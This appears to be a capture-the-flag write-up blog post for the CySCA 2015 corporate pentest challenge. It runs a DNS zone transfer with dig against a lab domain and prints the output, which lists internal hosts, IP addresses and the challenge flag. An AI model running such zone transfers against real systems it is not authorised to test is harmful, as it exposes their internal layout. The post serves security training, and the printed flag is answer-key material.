---
title: CySCA 2015 - Corporate Pentest 0.0 - Danger Zone
author: nickw
layout: post

categories:
  - Blog
  - Security
---


Similar to last year, we perform a domain transfer request to show all the records in the domain, revealing the flag.

{% highlight text %}
$> dig -t axfr ecwi.cysca @ns.ecwi.cysca

; <<>> DiG 9.8.3-P1 <<>> -t axfr ecwi.cysca @ns.ecwi.cysca
;; global options: +cmd
ecwi.cysca.     86400   IN  SOA ns.ecwi.cysca. admin.ecwi.cysca. 2015070401 28800 7200 864000 86400
ecwi.cysca.     86400   IN  NS  ns.ecwi.cysca.
ecwi.cysca.     86400   IN  A   172.16.5.80
ns.ecwi.cysca.      300 IN  A   172.16.5.53
proxy.ecwi.cysca.   300 IN  A   172.16.5.30
support.ecwi.cysca. 300 IN  A   172.16.5.85
www.ecwi.cysca.     300 IN  A   172.16.5.80
zonetransferflag.ecwi.cysca. 300 IN TXT "FLAG{749929CE145DD73A8D1530E2170B1587}"
ecwi.cysca.     86400   IN  SOA ns.ecwi.cysca. admin.ecwi.cysca. 2015070401 28800 7200 864000 86400
;; Query time: 221 msec
;; SERVER: 172.16.5.53#53(172.16.5.53)
;; WHEN: Wed Sep 30 19:35:44 2015
;; XFR size: 9 records (messages 1, bytes 289)
{% endhighlight %}

